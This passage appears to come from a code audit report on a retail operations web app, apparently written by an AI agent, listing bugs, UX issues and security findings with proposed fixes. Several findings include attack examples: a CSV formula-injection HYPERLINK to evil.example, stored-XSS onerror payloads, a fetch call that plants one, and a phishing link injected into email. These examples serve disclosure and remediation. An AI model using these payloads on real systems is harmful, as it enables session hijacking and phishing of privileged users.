**Proposed fix.** Split fill and text as DESIGN.md prescribes. Add `--mbadt:#c0392b` in `#page-mos` and `--mbadt:#f87171` in `.dark #page-mos`. Use `color:var(--mbadt)` in `.mos-status.err`, `.mos-chip.Stolen`, `.mos-rz[data-r="Stolen"][aria-pressed="true"]` and `.mos-req`, and keep --mbad for borders and fills.

<a id="oppbuys-mos-13"></a>
#### oppbuys-mos-13 — MOS CSV export does not neutralise spreadsheet formulas in user-taught descriptions and names

*medium · minor · security · confidence medium · `index.html:30308` · unverified*

**Evidence.** index.html:30308-30311 `const cell = (v) => { const s = …String(v); return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s; };` does not handle a leading = + - @ and does not quote \r. The Item Description comes from sticker_codes, which any account with MOS edit can teach, associates included (worker.js:25499-25505: `tagText(body?.description, 120)` requires only length ≥3 and one letter, so '=HYPERLINK("http://x","Open")' passes). Logged By comes from an admin-typed name. No formula guard exists anywhere in the repo (grep).

**Failure scenario.** An associate scanning an unnamed code teaches the name `=HYPERLINK("https://evil.example","Invoice")`. Every later export a manager opens in Excel renders a live link in the description column, or a formula, for every store's log that includes that category.

**Proposed fix.** For text columns only (store, code, item_no, description, reason, logged_by), prefix a single quote when the value matches `/^[=+\-@\t\r]/`, and quote on `/[",\r\n]/`. Leave the numeric money cells alone so they stay numbers. Optionally reject leading `= + @` in the worker's teach path too (a self-contained added guard).

<a id="oppbuys-mos-19"></a>
#### oppbuys-mos-19 — Every buy detail open walks all coded archive rows for MIN(date)

*medium · minor · performance · confidence medium · `worker.js:23828` · unverified*

**Evidence.** worker.js:23827-23829 `SELECT MIN(date) AS from_date FROM payment_archive_items WHERE code IS NOT NULL`. The only supporting index is migration-072.sql:68-69 `ON payment_archive_items(code) WHERE code IS NOT NULL`, which does not lead with date, and the PK leads with store (migration-064.sql:44-54). SQLite can only answer this by visiting every coded row, or every row. migration-064 puts the table at about 400k rows per 90 days, and since Phase 3 almost every line carries a code.

**Failure scenario.** A few months after Phase 3, each tap on a buy reads well over a million rows just to learn a date that has not changed since 2026-09-21. Detail opens get slower and D1 rows-read costs grow without bound.

**Proposed fix.** Worker only. Memoise the boundary, which can only move earlier through a deliberate re-bank. Keep a module-level cache, and back it with KV (`ob:tracked-from`, TTL about 1 h) that is refreshed only on a miss, so the MIN runs about once an hour per isolate instead of on every open. A longer-term alternative is an index on (date) WHERE code IS NOT NULL, which is a migration.

<a id="oppbuys-mos-15"></a>
#### oppbuys-mos-15 — mos-update lets any page-edit account cut a recorded loss or move it out of Shrink, keeps no prior value, and the UI never shows the edit

*medium · major · security · confidence medium · `worker.js:25673` · unverified*

**Evidence.** worker.js:25645-25674: the gate is `requirePage(…, "mos", "edit")` plus the row's store, then `UPDATE mos_entries SET qty = ?, reason = ?, edited_by = ?, edited_at = ? WHERE id = ?`, which overwrites the original values. ACTION_PAGE (worker.js:14658) grants mos-update to associates at 'edit'. index.html:30144 shows 'Edit' on every row of every month to anyone with mosCanEdit. mosRowHtml (30135-30157) never renders edited_by/edited_at. Yet mos-delete is kept manager-only because 'Removing a recorded loss is exactly the action you would not hand to the person whose mistake or shrink it records' (worker.js:25683-25685). Editing qty 50→1, or Stolen→Store Use, which drops the line out of shrink_cents (25619), has the same effect.

**Failure scenario.** An associate with MOS edit changes last week's '24 × Stolen' entry to '1 × Store Use'. The month's shrink drops by 24 units and it is no longer counted as shrink. The original values are gone, and nothing in the log shows the row was edited.

**Plan.** FUTURE PLAN, needs Brian's policy call. Options: (a) immediately and frontend-only, show 'edited by X · date' under the row's When cell, since edited_by/edited_at are already returned; (b) a worker-only added guard so non-financial roles may edit only rows they logged (logged_by === actorLabel) on the same ET day, with managers unchanged; (c) keep history with a migration adding orig_qty/orig_reason set on first edit, or a mos_edits table. Deploy order for (c): migration → worker (writes the new columns) → frontend (shows them), because the worker is the side that stops being compatible with an unmigrated DB. Verify with test-mos: an associate editing another person's row gets 403, and the original values survive an edit.

<a id="oppbuys-mos-9"></a>
#### oppbuys-mos-9 — Closing an already-closed buy overwrites who closed it and when; the Close button has no busy guard

*low · minor · bug · confidence high · `worker.js:23997` · unverified*

**Evidence.** worker.js:23983-23999 reads `status` but never checks it: `UPDATE ob_buys SET status = 'closed', closed_by = ?, closed_at = ? WHERE po = ?` runs whatever the current state. index.html:29737-29744 obSetClosed does not disable the button, and the button's meaning comes from the render time (29515 `obSetClosed('…', ${buy.status === 'open'})`). test-opportunity-buys covers close and reopen once each, not a repeat close.

**Failure scenario.** Admin A closes PO 12345 at 10:00. Admin B, whose detail page has been open since 9:00 and still shows 'Close this buy', taps it at 11:00. closed_by becomes B and closed_at 11:00, and the record of who actually stopped the buy is lost. A double tap also sends two writes.

**Proposed fix.** Worker: add `AND status = 'open'` to the close UPDATE and `AND status = 'closed'` to the reopen UPDATE. Read `res.meta.changes` and return `{ ok: true, po, status: <actual>, changed: changes > 0 }`, which keeps the same shape plus one field. Frontend: pass the button (`obSetClosed(this, …)`), set `disabled` for the duration, and when `j.changed === false` show 'Already closed by X on D' from the refreshed detail.

<a id="oppbuys-mos-10"></a>
#### oppbuys-mos-10 — MOS 'This month' is the newest month that has entries, not the current ET month (badge and export)

*low · minor · bug · confidence high · `index.html:30304` · unverified*

**Evidence.** index.html:30168 `const isNow = m.month === mosState.months[0].month;` and index.html:30303-30305 `const now = j.months[0].month; rows = rows.filter(x => x.month === now);`. The worker's `months` array (worker.js:25622) holds only months that have rows, sorted descending.

**Failure scenario.** On 1 October, before anything has been marked out, September carries the green 'This month' badge. Export → 'This month' downloads September's lines named mos-bl1-2026-10-01.csv instead of saying 'Nothing to export in that range'.

**Proposed fix.** `const mosNowMonth = () => new Date().toLocaleDateString('en-CA', { timeZone: 'America/New_York' }).slice(0, 7);`. Use `m.month === mosNowMonth()` for isNow and `x.month === mosNowMonth()` in the export filter.

<a id="oppbuys-mos-12"></a>
#### oppbuys-mos-12 — Save confirmation double-escapes the category name ('BEDDING &amp; PILLOWS')

*low · minor · bug · confidence high · `index.html:30090` · unverified*

**Evidence.** index.html:30090 `mosSetStatus(`Marked out · ${qty} × ${escapeHtml(j.description)}` …)`. mosSetStatus writes with `s.textContent = msg` (29283). Real categories contain '&' (worker.js/index.html: 'FG BL HOME - BEDDING & PILLOWS', 'FG BL SEASONAL - LAWN & GARDEN', 'FG BL CONSUMABLES - FOOD - COFFEE & TEA'). Browser probe status text: 'Marked out · 2 × FG BL HOME - BEDDING &amp; PILLOWS · $0.70 cost'.

**Failure scenario.** Every successful mark-out of an ampersand category shows a literal '&amp;' in the confirmation the associate reads.

**Proposed fix.** Drop escapeHtml there: `${j.description}`. textContent is already safe.

<a id="oppbuys-mos-14"></a>
#### oppbuys-mos-14 — An account with no MOS store sees the entry form, and the explanation is written into the hidden Log pane

*low · minor · bug · confidence high · `index.html:29323` · unverified*

**Evidence.** index.html:29323-29329 `if (!stores.length) { mosSetLogStatus(…'No store is assigned…'); el('mos-months').innerHTML = ''; return; }` returns before mosSetTab, so #mos-pane-mark keeps its default visibility and #mos-pane-log (markup 4144 `hidden`) stays hidden. Browser probe as a manager holding only BL8 (Holland, filtered out at 29249): markPaneVisible true, scanBtnVisible true, logPaneVisible false, logStatusVisible false. The same happens for a view-only associate, whose Mark tab button is hidden while the Mark pane shows.

**Failure scenario.** A Holland manager, or an associate granted MOS but given no store, opens the page and gets Scan/Photo/Look it up. Every lookup fails with 'Invalid store', and the sentence that explains why is never shown.

**Proposed fix.** In the no-stores branch, before returning: `el('mos-tab-mark').hidden = true; el('mos-pane-mark').hidden = true; el('mos-pane-log').hidden = false; el('mos-tab-log').setAttribute('aria-selected', 'true');`. Bin Dump's init (27507-27512) similarly hides its begin block.

<a id="oppbuys-mos-16"></a>
#### oppbuys-mos-16 — Opportunity Buys list/detail responses are applied out of order

*low · minor · bug · confidence high · `index.html:29470` · unverified*

**Evidence.** obLoad (29394-29406) and obOpenDetail (29464-29485) each `await obApi(...)` and render unconditionally. obShowList (29385-29391) hides #ob-back and shows #ob-filter synchronously, but a late detail response then renders the detail (29481) and sets the bar label (29480) without restoring those controls. Quick filter changes (onchange=obLoad at 3808) race the same way. obRenderList(buys, want) uses the `want` captured at request time.

**Failure scenario.** A user taps a buy and immediately taps '← All buys'. When the detail reply lands second, they are left on the buy's detail with no Back button and the list filter showing. Or: Open → Closed quickly shows open buys under the 'Closed' filter with the sentence 'No open buys yet'.

**Proposed fix.** `let obSeq = 0;`. In obLoad and obOpenDetail: `const seq = ++obSeq;` right after setting obView, then `if (seq !== obSeq) return;` after the await, before any DOM or obCanEdit/obTracked write.

<a id="oppbuys-mos-17"></a>
#### oppbuys-mos-17 — The 'more to the right' fade scrolls away with the table and never turns off at the end

*low · minor · ui-ux · confidence high · `index.html:3767` · unverified*

**Evidence.** index.html:3766-3770 `#ob-scroll { position: relative; } #ob-scroll.ob-more::after { position: absolute; …right: 0 … }`. The pseudo-element is positioned inside the scroll container itself, so it scrolls with the content. obFade (29357-29362) toggles only on `scrollWidth - clientWidth > 1`, which scrolling never changes, even though the comment at 29363 says scroll 'changes the answer'. Browser probe at 393px with a long buy name: 299px of overflow. The fade's right edge sat 0px from the box edge at scrollLeft 0 and 299px from it at the end, over the middle of the table, with `ob-more` still set. index.html:3772 also writes op-panel as `rgba(16,24,38,0)`, a spelling DESIGN.md §2.1 forbids.

**Failure scenario.** On a phone, after swiping the buy list to the right, a 34px white (or navy) gradient covers cells mid-table, and there is no longer any cue for 'you are at the end'. That is the reverse of what the fix at 3714-3724 intended.

**Proposed fix.** Wrap #ob-scroll in `<div id="ob-scroll-wrap" style="position:relative">` and move the `::after` rule to `#ob-scroll-wrap.ob-more::after`. In obFade toggle the class on the wrapper when `box.scrollLeft + box.clientWidth < box.scrollWidth - 1`. Use `rgb(var(--op-panel) / 0)` for the dark gradient start.

<a id="oppbuys-mos-18"></a>
#### oppbuys-mos-18 — The OB manifest CSV is always decoded as UTF-8, so Excel's default Windows-1252 CSVs lose characters

*low · minor · bug · confidence medium · `index.html:29577` · unverified*

**Evidence.** index.html:29577 `try { csv = await file.text(); }`. Blob.text() always decodes UTF-8 and replaces invalid bytes with U+FFFD. Excel on Windows saves 'CSV (Comma delimited)' as Windows-1252, where ’ ® ™ é ½ are single bytes that are invalid in UTF-8. The only client check is size (29573). The input is `accept=".csv,text/csv"` (3829), yet the worker's manifest-upload already parses xlsx for the Scorer (index.html:23057-23066 sends format:'xlsx', file_b64).

**Failure scenario.** A buyer exports the vendor's sheet from Excel and uploads it. Descriptions such as 'Men’s Hanes® Crew' are stored as 'Men�s Hanes� Crew', and that is the text a scan on the PO shows on the floor. UPCs and prices still match, so nothing flags the problem.

**Proposed fix.** `const buf = await file.arrayBuffer(); try { csv = new TextDecoder('utf-8', { fatal: true }).decode(buf); } catch (_) { csv = new TextDecoder('windows-1252').decode(buf); }`. Refuse `/\.xlsx?$/i` names with 'Save it as CSV first' instead of sending binary as CSV. Accepting xlsx through the Scorer's file_b64 path is a separate, larger follow-up.

<a id="oppbuys-mos-20"></a>
#### oppbuys-mos-20 — Each MOS lookup and log parses the whole item-cost master to read one category cost

*low · minor · performance · confidence medium · `worker.js:13351` · unverified*

**Evidence.** worker.js:13349-13356 mosCostCents calls `fetchItemCosts(env)`, which (3679-3695) reads and JSON-parses BOTH `item-costs:global`, the per-IM# master with a desc per item, and `category-costs:global`, then uses only `costs.categories[description]`. It runs on every mos-lookup (25443) and every mos-log (25515).

**Failure scenario.** Each scan at the warehouse door pays for fetching and parsing the full item master, potentially thousands of entries, on the latency-critical scan→fill path, and pays again on Save.

**Proposed fix.** Read only what is used: `const cat = await env.SALES_SNAPSHOTS.get(CATEGORY_COSTS_KEY, 'json'); const raw = cat?.costs?.[description];`. This also makes the IM#/category key collision described in tasks/mos.md structurally impossible. test-mos section 3 can pin it.

<a id="oppbuys-mos-21"></a>
#### oppbuys-mos-21 — mosSave stays 'busy' through a full 6-month log reload, so a quick next Save is silently ignored

*low · minor · performance · confidence high · `index.html:30093` · unverified*

**Evidence.** index.html:30093 `await mosLoad();` sits inside the try, so `mosState.busy = false` in finally (30097) waits for mos-list?months=6, which returns the unlimited totals query plus 500 rows. Meanwhile mosApply → mosRecalc re-enables #mos-save (29799 does not consider busy), and mosSave returns early on `mosState.busy` (30073) with no message.

**Failure scenario.** On slow wifi an associate saves one sticker, scans the next (the reason is remembered) and taps Save within about a second. Nothing happens and nothing is said, so they tap again or walk away thinking it was logged.

**Proposed fix.** Release first: in the try, after mosReset/status, set `mosState.busy = false;` and call `mosLoad();` without await, or move the reload after the finally. Add `|| mosState.busy` to the Save disabled gate in mosRecalc so the state is visible.

<a id="oppbuys-mos-22"></a>
#### oppbuys-mos-22 — Phone: sub-16px inputs trigger iOS zoom-on-focus and most controls are under 44px

*low · minor · ui-ux · confidence high · `index.html:3923` · unverified*

**Evidence.** index.html:3923 `.mos-teach input{…font-size:13px…}`, which is auto-focused at 29852; 4015 #mos-store `text-sm` (14px); 3674-3675 `.ob-in{…font-size:13px}` on #ob-filter and every Open-a-buy field. Measured at 393px in the browser probe: obFilter/obPo 13px, mosStore 14px, mosTeach 13px. Tap targets measured: #ob-new 68×36, #ob-f-go 84×36, #ob-filter 88×33, .mos-rz 73×39, MOS tab 82×39. .mos-row-btn (4001, padding 5px 9px at 11.5px) is about 26px, and #mos-torch/#mos-lens are 40px (4066-4073). DESIGN.md §3.2 names 16px for the Menu search 'or iOS zooms on focus', and §9 asks for ≥40-44px targets.

**Failure scenario.** An associate taps 'name this code' on an iPhone. The PWA zooms in and stays zoomed after the keyboard closes, so they have to pinch out on every teach. A manager aiming at 'Edit' on a log row hits 'Remove' beside it.

**Proposed fix.** `@media (max-width:640px){ #page-mos .mos-teach input, #mos-store, #page-opportunity-buys .ob-in { font-size:16px } #page-opportunity-buys .ob-btn, #page-opportunity-buys .ob-btn-primary, #page-mos .mos-rz, #page-mos .mos-row-btn { min-height:44px } }`, and make #mos-torch/#mos-lens 44px.

<a id="oppbuys-mos-23"></a>
#### oppbuys-mos-23 — MOS tables force 800px on a phone, putting Edit/Remove off-screen; under 'All stores' there is no Store column

*low · minor · ui-ux · confidence high · `index.html:3982` · unverified*

**Evidence.** index.html:3982 `table.mos-tbl{…min-width:800px…}` on both 'Marked out today' (4129-4138) and the month tables (30193-30201). The row actions are the last column (30155). Unlike Opportunity Buys' `.ob-sec` pattern (3731-3733), nothing hides secondary columns and nothing hints that the table scrolls. mosRowHtml (30146-30156) has no store cell, although the select offers 'All stores' (29312).

**Failure scenario.** On a 393px phone, correcting the entry just made means swiping about 400px right in 'Marked out today' to find Edit. A multi-store reader on 'All stores' cannot tell which store any line belongs to without exporting.

**Proposed fix.** Tag Item #, Retail and When as `.mos-sec` and hide them at ≤560px. Drop min-width to about 520px there and move the action cell to follow Qty/Cost on the phone. When `el('mos-store').value === 'ALL'`, add a Store column (MOS_LABELS[r.store]).

<a id="oppbuys-mos-24"></a>
#### oppbuys-mos-24 — 'Marked out today' and collapsed month headers show short cost totals with no caveat

*low · minor · bug · confidence high · `index.html:30226` · unverified*

**Evidence.** index.html:30226 `const cost = mine.reduce((a, r) => a + (r.unit_cost_cents || 0) * r.qty, 0);` counts a null cost as $0 and prints `… · $X cost` (30228), even though the header comment (29228-29231) says the client computes no money for the log. The month header meta (30181 `<b>${mosMoney(m.cost_cents)}</b> cost`) shows without the lines_without_cost warning, which appears only inside the expanded body (30171-30172).

**Failure scenario.** Today 3 of 5 lines are in the four categories with no cost on file, and the bar reads '5 lines · 12 units · $1.05 cost' as if complete. A collapsed month reads '$0.00 cost' when every line lacks a cost.

**Proposed fix.** Count `mine.filter(r => r.unit_cost_cents == null).length` and append ` · N without cost` when it is non-zero. In the month head meta, append `<span>${m.lines_without_cost} without cost</span>` when it is non-zero.

<a id="oppbuys-mos-25"></a>
#### oppbuys-mos-25 — A11y: buy rows are mouse-only; status and error lines are not announced; the OB form's errors render in muted grey

*low · minor · accessibility · confidence high · `index.html:29440` · unverified*

**Evidence.** index.html:29440 `<tr class="ob-row" onclick="obOpenDetail('…')">` has no tabindex, role or key handler, so a keyboard user cannot open a buy. #mos-status (4114), #mos-log-status (4155), #ob-status (3838) and #ob-f-note (3832) have no role=status/aria-live. obCreate writes errors with `note.className = 'ob-dim'` (29711), in the same muted #6b6453 as helper text. MOS reason buttons do use aria-pressed and the month heads aria-expanded (good). #mos-torch has no aria-pressed.

**Failure scenario.** A screen-reader user saves a mark-out and hears nothing, success or refusal. A keyboard-only admin cannot reach any buy's detail. 'PO 99999 is already a buy (open)' reads as a hint, not an error.

**Proposed fix.** Render the PO cell as `<td class="ob-po"><button type="button" class="ob-link" onclick="…">${po}</button></td>`, or add `tabindex="0"` plus an Enter/Space keydown on the row. Add `role="status" aria-live="polite"` to the four status nodes. Use `note.className = 'ob-note warn'` for obCreate errors. Toggle `aria-pressed` on #mos-torch in mosTorch.

</details>

<a id="supply-request"></a>
### Supply Request

The weakest part of Supply Request is how it renders and stores untrusted input. Item quantity and unit are shown without escaping, and the worker stores whatever a manager sends. I confirmed with the real worker plus a stubbed browser run that a manager-written payload executes in the superuser's All Requests view (stored XSS with privilege escalation), and the same text lands unescaped in the superuser's email. The money side has four confirmed problems. Deleting a user in the Users page cascades away all their supply requests and the spend the Budget tab sums (proven on the real schema). Reports asks for 1,000 rows but gets at most 200, urgent first, so monthly totals are silently truncated. The 80% alert is missed when cost is entered before the status is set to Ordered, and fires falsely otherwise (proven with the real handlers on sqlite). Budget months are counted in UTC while Reports uses ET. The purge itself is careful: superuser-only on both sides, a 30-day floor, a per-status preview, a recount that refuses on drift (409), explicit child deletes, and a confirm listing the spend removed. Its gaps are that it doesn't say it covers all stores, the recount is skipped if the client omits it, and nothing is archived before deleting. Superuser and manager UX is hurt by saves that collapse the open request and erase their own confirmation, a form wiped on every revisit, stale cached details, 14px inputs that trigger iOS zoom, sub-AA contrast on the active chip, the Urgent selection, the Delete button and the Under Review pill, and rows that can't be opened from the keyboard. Things already done well: the app's own confirm and alert dialogs are used instead of the browser's (which freeze the installed app), write buttons are disabled while saving, frontend and worker role gates match for every superuser-only action, and most user text (item names, notes, comments, emails) is escaped. Scratch evidence is in /tmp/claude-0/-home-user-labor-dashboard/b15de0d6-9cbf-5272-ba75-ac683e2a7c19/scratchpad/supply-request/ (harness.mjs, harness2.mjs, alert80.mjs, xss-worker.mjs, cascade.mjs, contrast*.mjs).

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [supply-request-1](#supply-request-1) | high | minor | security | Stored XSS: item quantity/unit are rendered raw in request detail (any manager → superuser session) | `index.html:12929` | unverified |
| [supply-request-3](#supply-request-3) | high | minor | bug | Deleting a user cascades away every supply request they submitted, including the spend the Budget and Reports tabs sum | `worker.js:18551` | unverified |
| [supply-request-4](#supply-request-4) | high | minor | bug | Reports asks for limit=1000 but the worker caps at 200 (urgent first), so monthly spend, KPIs, All Requests and CSV are silently truncated | `index.html:13438` | unverified |
| [supply-request-2](#supply-request-2) | medium | minor | security | Item names, notes and emails go unescaped into the new-request HTML email sent to superusers | `worker.js:8974` | unverified |
| [supply-request-5](#supply-request-5) | medium | minor | bug | 80% budget alert fires on the wrong set: missed when cost is entered before 'Ordered', spurious otherwise, never checked on status change | `worker.js:21875` | unverified |
| [supply-request-6](#supply-request-6) | medium | minor | bug | Budget spend is bucketed by UTC month; Reports bucket the same rows by local (ET) month, so they disagree at every month boundary | `worker.js:21917` | unverified |
| [supply-request-7](#supply-request-7) | medium | minor | ui-ux | Save Status collapses the open request and reloads the whole list; both save confirmations are erased before they can be read | `index.html:13029` | unverified |
| [supply-request-8](#supply-request-8) | medium | minor | bug | Comments by anyone other than the original requester never notify superusers | `worker.js:9477` | unverified |
| [supply-request-9](#supply-request-9) | medium | minor | ui-ux | Every visit to Supply Request re-renders the New Request form, wiping unsubmitted items | `index.html:12348` | unverified |
| [supply-request-10](#supply-request-10) | medium | minor | bug | Load failures (401/403/500) render as empty states; the filtered-empty state says 'Submit your first request' | `index.html:12607` | unverified |
| [supply-request-11](#supply-request-11) | medium | minor | bug | Detail cache is never invalidated on refresh or re-list, so expanded requests show a stale timeline and status | `index.html:12684` | unverified |
| [supply-request-12](#supply-request-12) | medium | minor | bug | Out-of-order responses: budget month navigation can show one month's numbers under another month's label; filter reloads race too | `index.html:13295` | unverified |
| [supply-request-13](#supply-request-13) | medium | minor | ui-ux | Purge panel doesn't say it ignores the store/status filters it sits under: it deletes across all stores | `index.html:13192` | unverified |
| [supply-request-18](#supply-request-18) | medium | minor | ui-ux | Phone form: 14px inputs trigger iOS focus-zoom; remove-item and filter-chip tap targets are about 25px | `index.html:12444` | unverified |
| [supply-request-19](#supply-request-19) | medium | minor | accessibility | Text contrast below 4.5:1 on the active filter chip, the Urgent selection, the Delete button, the 'Under Review' pill and save/error messages | `index.html:12625` | unverified |
| [supply-request-20](#supply-request-20) | medium | minor | accessibility | Request rows can't be opened from the keyboard; tabs, labels and priority radios lack semantics and focus indication | `index.html:12877` | unverified |
| [supply-request-14](#supply-request-14) | medium | major | bug | Purge and delete permanently erase requests and their recorded spend with no archive; the only undo is a whole-DB restore | `worker.js:26704` | unverified |
| [supply-request-15](#supply-request-15) | low | minor | ui-ux | Single 'Delete Request' confirm doesn't mention the spend it removes from the budget | `index.html:13098` | unverified |
| [supply-request-16](#supply-request-16) | low | minor | accessibility | Danger confirms focus the destructive button and accept Enter, so a second Enter confirms the purge | `index.html:7826` | unverified |
| [supply-request-17](#supply-request-17) | low | minor | security | Purge's drift guard is optional server-side and compares only the total count | `worker.js:26693` | unverified |
| [supply-request-21](#supply-request-21) | low | minor | ui-ux | Reports on a phone: the sticky Month column scrolls away, KPI amounts overflow their tiles, and unchecked purge checkboxes paint white in dark | `index.html:13527` | unverified |
| [supply-request-22](#supply-request-22) | low | minor | ui-ux | Closed Holland (BL8) raises a permanent 'store needs a budget' warning and stays selectable for new requests | `index.html:13305` | unverified |
| [supply-request-23](#supply-request-23) | low | minor | bug | Budget severity uses the rounded percentage: 99.5% shows red '100% used' next to '$75.00 left' | `index.html:13326` | unverified |
| [supply-request-24](#supply-request-24) | low | minor | bug | CSV exports: truncation not stated, no BOM (em dash turns to mojibake), Reports CSV merges counts into the money cells | `index.html:13548` | unverified |
| [supply-request-25](#supply-request-25) | low | minor | bug | Request creation isn't atomic, and quantity/store aren't validated (negative quantities are accepted from the form) | `worker.js:21674` | unverified |
| [supply-request-26](#supply-request-26) | low | minor | ui-ux | Fulfillment can't clear a wrong cost or invoice, and a negative cost is accepted | `index.html:13044` | unverified |
| [supply-request-27](#supply-request-27) | low | minor | performance | Redundant round trips: every Save Fulfillment reloads the hidden Budget pane (12 D1 queries); Save Status refetches the full 200-row list | `index.html:13064` | unverified |
| [supply-request-28](#supply-request-28) | low | minor | security | Executives can create supply requests and comment through the API although their role 'changes nothing' and the UI refuses them | `worker.js:21650` | unverified |
| [supply-request-30](#supply-request-30) | low | minor | code-quality | The page's only bulk DELETE (purge) has no committed regression test | `worker.js:26672` | unverified |
| [supply-request-29](#supply-request-29) | low | major | ui-ux | Queue rows show only 'N items': the superuser must expand every request to see what is being asked for | `index.html:12874` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="supply-request-1"></a>
#### supply-request-1 — Stored XSS: item quantity/unit are rendered raw in request detail (any manager → superuser session)

*high · minor · security · confidence high · `index.html:12929` · unverified*

**Evidence.** index.html:12705 (srRenderDetail) and index.html:12929 (srRenderSuperDetail) both render `<td ...>${it.quantity} ${it.unit}</td>`. These are the only unescaped fields in those rows: category, item_name and notes all go through escapeHtml. On the server, worker.js:21684-21685 binds `it.quantity || 1, it.unit || 'units'` with no type check and no whitelist. The column is `quantity INTEGER` in a non-STRICT table (migration-011.sql), so SQLite keeps a non-numeric string as TEXT. I proved it by driving the real worker through scripts/lib/worker-harness.mjs. POST supply-request-create as u-mgr1 with unit `<img src=x onerror=alert(2)>` and the same kind of string in quantity returned 200, and GET supply-request returned both strings unchanged. I then ran Chromium against the static site copy with a stubbed fetch. Expanding that request ran the onerror handler in both srToggleDetail and srToggleSuperDetail (window.__pwned became 1 in each). The same gap exists for the superuser-written invoice number: `#${req.invoice_number}` at 12743 and `value="${req.invoice_number||''}"` inside an attribute at 12975.

**Failure scenario.** Any signed-in manager scoped to one store can open DevTools and run fetch('…?action=supply-request-create', {method:'POST', credentials:'include', body: JSON.stringify({store:'BL1', items:[{item_name:'Mop', unit:'<img src=x onerror=…>'}]})}). When the superuser opens All Requests and expands that request, the script runs in the superuser's session. From there it can call supply-requests-purge, delete-user, supply-budget-set and every other superuser endpoint.

**Proposed fix.** Frontend (closes the hole): at index.html:12705 and :12929 write `${escapeHtml(it.quantity)} ${escapeHtml(it.unit)}`. At :12743 write `#${escapeHtml(req.invoice_number)}`. At :12975 write `value="${escapeHtml(req.invoice_number||'').replace(/"/g,'&quot;')}"`, because escapeHtml does not escape quotes. Worker, as extra safety that normalises rather than rejects, so the contract does not change: inside the create loop (worker.js:21666-21669) add `const q = parseInt(it.quantity, 10); it.quantity = Number.isFinite(q) && q > 0 ? Math.min(q, 9999) : 1; if (!SR_UNITS.includes(it.unit)) it.unit = 'units';`, with SR_UNITS mirroring index.html:12296. To verify, re-run the worker-harness create call and confirm the stored quantity is 1 and the unit is 'units', then re-run the browser stub and confirm __pwned stays 0.

<a id="supply-request-3"></a>
#### supply-request-3 — Deleting a user cascades away every supply request they submitted, including the spend the Budget and Reports tabs sum

*high · minor · bug · confidence high · `worker.js:18551` · unverified*

**Evidence.** migration-011.sql:7 declares `user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE`, and items and history cascade from the request. delete-user runs `DELETE FROM users WHERE id = ?` (worker.js:18551). The header of migration-029.sql records that this cascade was measured on D1 and fires ("taking every … SUPPLY REQUEST with it — including the `cost` the Budget tab sums"). I reproduced it on the real migration-011 schema in node:sqlite with the endpoint's exact statement: before {requests:1, spent:812.5, items:1}, after {0, 0, 0}. The Users page confirm (index.html:34729) says only "This will remove their account and sign them out."

**Failure scenario.** A store manager leaves and the superuser deletes the account, which is normal housekeeping. Every request that manager ever filed disappears from All Requests and from the co-managers' My Requests. That store's Budget-tab spend (including the current month) and its Reports history drop by the sum of the manager's ordered costs, so the store suddenly shows budget 'left' that is already spent.

**Proposed fix.** Minor guard, worker-only, adds safety: in delete-user, before the DELETE, run `const n = await env.DB.prepare('SELECT COUNT(*) AS n FROM supply_requests WHERE user_id = ?').bind(id).first();`. If n.n is non-zero, return 409 `{error: `This user submitted ${n.n} supply request(s); deleting would erase them and their recorded spend. Suspend the account instead.`}`. The Users page already shows data.error through usersSetStatus. The structural fix is a separate major change: rebuild supply_requests with user_id nullable and ON DELETE SET NULL (user_email is already denormalised), using migration-029's snapshot/restore pattern because DROP fires the cascade.

<a id="supply-request-4"></a>
#### supply-request-4 — Reports asks for limit=1000 but the worker caps at 200 (urgent first), so monthly spend, KPIs, All Requests and CSV are silently truncated

*high · minor · bug · confidence high · `index.html:13438` · unverified*

**Evidence.** srLoadReports fetches `?action=supply-requests&limit=1000` (13438), but worker.js:21715 sets `limit = Math.min(parseInt(...), 200)` and sorts `ORDER BY CASE r.priority WHEN 'urgent' THEN 0 ELSE 1 END, r.submitted_at DESC` (21740-21742). The response includes `total` (21750), but nothing reads it (12607, 12829, 13443). All Requests (12827, limit=200) and srExportCSV (13119, from srAllRequests) have the same cap and never say 'showing 200 of N'. In the browser run the Reports call went out as limit=1000.

**Failure scenario.** Once the table passes 200 rows (six stores at a few requests a week get there in about 2–3 months unless purged), Reports aggregates every urgent request ever plus only the newest normal ones. Older months show a fraction of their spend and request counts, "Open (not ordered)" undercounts, and Reports disagrees with the Budget tab, which sums in D1. The CSV looks complete and is not.

**Proposed fix.** Frontend-only; the API already has offset and total. Add a pager: `async function srFetchAll(qs){const out=[];for(let off=0;;off+=200){const r=await fetch(`${WORKER_BASE}?action=supply-requests${qs}&limit=200&offset=${off}`,{credentials:'include'});const d=await r.json();if(!r.ok||!d.ok)throw new Error(d.error||`HTTP ${r.status}`);out.push(...d.requests);if(!d.requests.length||out.length>=d.total)break;}return out;}`. Use it in srLoadReports. In All Requests, show `Showing ${n} of ${d.total}` with a 'Load all' button, and have the CSV state its row count. To verify, stub 450 rows, check Reports month totals against a direct sum, and confirm the pager stops at total.

<a id="supply-request-2"></a>
#### supply-request-2 — Item names, notes and emails go unescaped into the new-request HTML email sent to superusers

*medium · minor · security · confidence high · `worker.js:8974` · unverified*

**Evidence.** buildSupplyRequestEmailHtml interpolates raw user text: `${it.category}`, `${it.item_name}`, `${it.quantity} ${it.unit}` and `${it.notes || '—'}` (worker.js:8973-8976), `Requested by ${requesterEmail}` (8983), and the request notes `${notes}` (8995). buildStatusUpdateEmailHtml does the same with `${note}` (9036). An `_esc` helper already exists at worker.js:6534 and the truck email uses it (8780). Using the real worker in worker-harness, I created a request with item_name `Trash bags <a href="https://evil.example/login">Approve here</a>`. The HTML handed to Resend for the superuser contained that live anchor and the raw `<img onerror>` (both checks returned true).

**Failure scenario.** Harmless case: a manager types 'Tape <2in>' and the superuser's email row renders broken or truncated. Hostile case: a manager plants an "Approve here" phishing link inside an email that genuinely comes from noreply@retjghub.com to the superuser.

**Proposed fix.** Worker-only and output-only. Wrap every interpolation in _esc(): it.category, it.item_name, it.quantity, it.unit, it.notes, notes and requesterEmail in buildSupplyRequestEmailHtml, and note in buildStatusUpdateEmailHtml. scripts/test-supply-email-transport.mjs asserts on the transport, not the markup, so it still passes. Add one assertion that the html contains `&lt;a href` for a hostile item name.

<a id="supply-request-5"></a>
